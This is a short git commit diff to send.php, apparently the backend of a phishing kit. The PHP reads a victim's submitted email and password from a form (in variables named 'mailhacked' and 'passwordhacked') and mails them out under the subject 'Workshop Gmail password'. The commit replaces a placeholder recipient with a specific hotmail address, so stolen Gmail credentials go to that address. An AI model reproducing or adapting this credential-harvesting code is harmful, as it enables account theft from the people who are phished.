bba12e48ac04841f193678f514fd5c4cca003820
ELGAUCHO2A <82913496+ELGAUCHO2A@users.noreply.github.com>
2021-04-21 00:40:37 +0200

    Update send.php

--- send.php
+++ send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "yourmailaddresshere@gmail.com";
+         $to = "vicentegaucho@hotmail.fr";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
